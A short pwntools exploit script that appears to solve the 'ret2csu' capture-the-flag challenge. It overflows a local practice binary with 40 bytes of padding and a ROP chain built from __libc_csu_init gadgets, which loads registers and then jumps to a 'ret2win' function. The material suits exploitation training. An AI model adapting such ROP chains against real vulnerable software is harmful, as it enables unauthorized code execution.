from pwn import *

p = process('./ret2csu')
p.recv()

payload  = b'A' * 40
payload += p64(0x00400576)          # ret align
payload += p64(0x0040089a)          # pop rbx ; pop rbp ; pop r12 ; 
                                    # pop r13 ; pop r14 ; pop r15; ret
payload += p64(0)                   # rbx
payload += p64(1)                   # rbp
payload += p64(0x00600e38)          # r12, init
payload += p64(0) + p64(0)          # r13, r14
payload += p64(0xdeadcafebabebeef)  # r15
payload += p64(0x00400880)          # mov rdx, r15 ; mov rsi ; mov rdi, r13d ;
                                    # call qword ptr [r12 + rbx*8] (init); 
                                    # add rbx, 0x1 ; cmp rbp, rbx ; 
                                    # jnz x ;
payload += p64(0)                   # add rsp, 0x8 ; 
payload += p64(0) + p64(0)          # pop rbx ; pop rbp ;
payload += p64(0) + p64(0)          # pop r12 ; pop r13 ;
payload += p64(0) + p64(0)          # pop r14 ; pop r15; ret
payload += p64(0x004007b1)          # ret2win

p.sendline(payload)
p.interactive()
